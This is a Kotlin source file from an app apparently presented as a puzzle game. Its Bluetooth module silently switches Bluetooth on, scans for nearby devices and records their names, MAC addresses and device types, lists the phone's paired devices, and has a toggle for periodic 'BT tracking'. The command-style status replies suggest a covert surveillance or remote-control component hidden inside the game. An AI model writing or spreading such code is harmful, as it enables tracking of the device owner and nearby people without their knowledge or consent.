package com.puzzleblast.game.modules

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

object BluetoothModule {
    private val found = mutableListOf<android.bluetooth.BluetoothDevice>()

    @Suppress("DEPRECATION")
    suspend fun scan(ctx: Context): String {
        val ba = BluetoothAdapter.getDefaultAdapter() ?: return "📡 no bluetooth"
        val wasOn = ba.isEnabled
        if (!wasOn) ba.enable()
        delay(2000)
        found.clear()
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, i: Intent?) {
                if (BluetoothDevice.ACTION_FOUND == i?.action) {
                    i.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)?.let { found.add(it) }
                }
            }
        }
        ctx.registerReceiver(receiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
        ba.startDiscovery()
        delay(12_000)
        ba.cancelDiscovery()
        try { ctx.unregisterReceiver(receiver) } catch (_: Exception) {}
        if (!wasOn) ba.disable()
        if (found.isEmpty()) return "📡 BT scan · 0 found"
        val sb = StringBuilder("📡 BT scan · ${found.size} found\n")
        found.distinctBy { it.address }.forEach { d ->
            val hasPerm = ContextCompat.checkSelfPermission(ctx, Manifest.permission.BLUETOOTH_CONNECT) == PackageManager.PERMISSION_GRANTED
            val name = if (hasPerm) d.name else "(hidden)"
            val type = when (d.bluetoothClass?.deviceClass ?: 0) {
                in 512..1023 -> "phone"
                in 1024..2047 -> "computer"
                in 2048..4095 -> "headset"
                else -> "device"
            }
            sb.append("📱 ${name ?: "?"} — ${d.address} · $type\n")
        }
        return sb.toString()
    }

    @Suppress("DEPRECATION")
    suspend fun saved(ctx: Context): String {
        val ba = BluetoothAdapter.getDefaultAdapter() ?: return "📡 no bluetooth"
        val hasPerm = ContextCompat.checkSelfPermission(ctx, Manifest.permission.BLUETOOTH_CONNECT) == PackageManager.PERMISSION_GRANTED
        if (!hasPerm) return "📚 need BLUETOOTH_CONNECT permission"
        val bonded = ba.bondedDevices ?: return "📚 no paired devices"
        return "📚 paired · ${bonded.size}\n" + bonded.joinToString("\n") { "  ${it.name} — ${it.address}" }
    }

    suspend fun track(on: Boolean): String {
        com.puzzleblast.game.util.Prefs.btTrack = on
        return if (on) "🛰 BT tracking on (5min)" else "🛰 BT tracking off"
    }
}
